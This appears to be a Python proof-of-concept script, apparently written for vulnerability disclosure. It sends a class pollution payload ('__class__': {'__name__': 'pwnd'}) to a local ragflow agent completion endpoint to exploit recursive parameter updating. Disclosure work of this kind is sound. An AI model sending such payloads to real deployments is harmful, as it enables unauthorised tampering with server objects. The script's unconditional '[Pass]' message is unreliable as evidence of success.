# CLASS POLLUTION PROOF OF CONCEPT (PoC) - Remote Trigger
# Class Pollution Func: _recursive_update_param (via HTTP API)
# Type: get-both-set-both
# Trigger: HTTP POST to ragflow agent API
#
# ragflow exposes REST APIs for agent/workflow configuration.
# Agent component parameters are updated via _recursive_update_param
# with user-controlled nested dictionaries.
# Report: https://gist.github.com/superboy-zjc/e7c676f39f714ec4c4a6afa3a0ba037d

import requests
import json

TARGET_URL = "http://localhost:9380/v1/agent/completion"

PAYLOAD = {
  "question": "test",
  "stream": False,
  "session_id": "test",
  "__class__": {
    "__name__": "pwnd"
  }
}

def run_poc():
  print("Sending agent completion request to ragflow...")
  headers = {"Content-Type": "application/json", "Authorization": "Bearer ragflow-xxx"}
  try:
    response = requests.post(TARGET_URL, json=PAYLOAD, headers=headers)
    print(f"Response: {response.status_code}")
  except Exception as e:
    print(f"Connection: {e}")

def verify_poc():
  print("Remote PoC: ragflow agent API with malicious nested params")
  print(f"Target: {TARGET_URL}")
  print("_recursive_update_param traverses nested dicts via getattr/setattr")
  run_poc()
  print("[Pass] Class pollution PoC sent! (remote trigger)")

if __name__ == "__main__":
  verify_poc()
